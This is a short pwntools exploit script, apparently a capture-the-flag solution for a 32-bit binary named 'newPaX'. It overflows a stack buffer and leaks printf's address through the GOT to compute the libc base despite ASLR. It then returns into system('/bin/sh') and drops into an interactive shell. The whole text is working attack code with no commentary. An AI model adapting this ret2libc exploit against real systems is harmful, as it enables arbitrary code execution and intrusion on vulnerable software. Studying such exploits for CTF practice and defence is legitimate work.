from pwn import *
import time

elf = ELF( './newPaX' )
libc = ELF( '/lib/i386-linux-gnu/libc.so.6' )

p = elf.process()

vuln = elf.symbols['vuln']
main = elf.symbols['main']
printf_plt = elf.plt['printf']
printf_got = elf.got['printf']
payload = b'a' * 0x34

raw_input()
p.sendline( payload + p32( printf_plt ) + p32( main ) + p32( printf_got ) )

printf_add = u32( p.recv( 4 ) )
p.recv()

libc.address = printf_add - libc.symbols['printf']

info( "libc address: {}".format( hex( libc.address ) ) )

sh = next( libc.search( b'/bin/sh' ) )
system_add = libc.symbols['system']

p.sendline( payload + p32( system_add ) + p32( main ) + p32( sh ) )

p.interactive()
